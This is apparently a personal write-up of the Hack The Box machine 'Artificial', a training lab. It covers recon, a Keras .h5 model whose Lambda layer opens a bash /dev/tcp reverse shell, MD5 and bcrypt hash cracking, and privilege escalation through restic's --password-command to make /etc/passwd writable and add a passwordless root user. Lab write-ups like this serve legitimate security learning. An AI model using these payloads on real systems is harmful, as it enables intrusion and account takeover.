---
title: HTB Artificial - Writeup
date: 2025-07-25 22:12:00 +0330
categories: [Writeup]
tags: [cve]
description: My writeup of Artificial from Hack The Box 

---

![](assets/img/artificial.png)
## - **Recon & Enum**
As always starting off with an Nmap scan
```
$ nmap -sC -sV -oN artificial_htb_nmap --min-rate=1000 artificial.htb
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.45s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
After logging in, we can upload `.h5` files which are AI models. There are also a `requirements.txt` which says tensorflow 2.13.1 and a Dockerfile.
First I tried building the docker image and running the container (because my python version does not support tensorflow yet) but I ran out of storage. so I installed `pyenv` and installed python3.8. After a bit of reasearch I found out tensorflow version 2.13 is vulnerable to [CVE-2024-3660](https://markaicode.com/tensorflow-cve-2024-3660-update-data-leak-prevention/), so with that information I tweaked the example code provided in the main page of artificital.htb to get a reverse shell.
```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers
import socket
import subprocess

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

def titap(x):
    try:
        __import__('os').system("bash -c '/bin/sh -i >& /dev/tcp/*.*.*.*/1234 0>&1'")
    except:
        pass
    return x

# Build the model

model = keras.Sequential([
    layers.Dense(64, activation='relu'),
    layers.Dense(64, activation='relu'),
    layers.Dense(1),
    layers.Lambda(titap)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

## - **Foothold**

and after clocking on "View Predictions", we get a shell.
```
listening on [any] 1234 ...
connect to [*.*.*.*] from (UNKNOWN) [10.10.11.74] 41924
/bin/sh: 0: can't access tty; job control turned off
$ python3 -V
Python 3.8.10
$ python3 -c "import pty;pty.spawn('/bin/bash')"
app@artificial:~/app$
```

Checking the `app.py`, I discovered a database and a password `Sup3rS3cr3tKey4rtIfici4L` (which turned out to be useless). from the database I got the hash for user `gael` and some other users.
```
sqlite> SELECT * FROM user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
```

I used hashcat to crack the hash
```shell
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```shell
$ hashcat --show hash.txt -m 0                          
c99175974b6e192936d97224638a34f8:mattp005numbertwo
```

## - **User**
and the user flag is ours!
```
gael@artificial:~$ cat user.txt
781a0825*******************4eae0
```

Here we can see ports `5000` and `9898` are localy accessible and also we have some application files in `/opt`.
```
gael@artificial:~$ ss -tuln
Netid    State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process    
udp      UNCONN    0         0              127.0.0.53%lo:53                0.0.0.0:*                  
tcp      LISTEN    0         2048               127.0.0.1:5000              0.0.0.0:*                  
tcp      LISTEN    0         4096               127.0.0.1:9898              0.0.0.0:*                  
tcp      LISTEN    0         511                  0.0.0.0:80                0.0.0.0:*                  
tcp      LISTEN    0         4096           127.0.0.53%lo:53                0.0.0.0:*                  
tcp      LISTEN    0         128                  0.0.0.0:22                0.0.0.0:*                  
tcp      LISTEN    0         511                     [::]:80                   [::]:*                  
tcp      LISTEN    0         128                     [::]:22                   [::]:*                  
gael@artificial:~$ ls /opt
backrest  config  data  index  keys  locks  snapshots
```

port 5000 was the flask application and 9898 was Backrest V1.7.2. I forwarded the port back to my computer and went to the page and it required login. at first I tried some default usernames with the discovered passwords so far but no luck. inside `/opt/backrest/.config/backrest/` there was a config.json file which most probably included the username nad password but user gael did not have access. after using linpeas I noticed a backfile `/var/backups/backrest_backup.tar.gz` which had the config.json in it with the password hash.
```
gael@artificial:/tmp$ tar -xvf backrest_backup.tar.gz

gael@artificial:/tmp/backrest/.config$ cat backrest/config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}

```

by the looks of the hash, it is base64 encoded. then we crack it with hashcat and log in to the backrest page.
```shell
$ echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO   
```

```shell
hashcat -m 3200 -a 0 -o cracked.txt hash2.txt /usr/share/wordlists/rockyou.txt
```

## - **Root**

Here we can create repositories and after that we can run commands though not normal shell commands, but restic commands! so I went to see what we can do with restic and it's idiotic name.

![](assets/img/artificial_restic.png)

in the help output of restic we can see `backup` and `dump` commands and with those we can read files which we normaly don't have access to, for instance root.txt! but that's like cheating and we need to get a shell.
![](assets/img/artificial_dump.png)
looking back at the help screen a very juicy looking flag called `--password-command` caught my eye.

```
--password-command command         shell command to obtain the repository password from (default: $RESTIC_PASSWORD_COMMAND)
```

after a bit of struggle, I finally got it to work and made passwd writable with `backup /etc/hosts --password-command "chmod 777 /etc/passwd"`.

```
gael@artificial:/opt/backrest$ echo "my_root::0:0:root:/root:/bin/bash" >> /etc/passwd
gael@artificial:/opt/backrest$ su my_root
root@artificial:/opt/backrest# chmod 644 /etc/passwd
root@artificial:/opt/backrest#
```

![](assets/img/artificial_congrats.png)

Done!
and thanks for reading.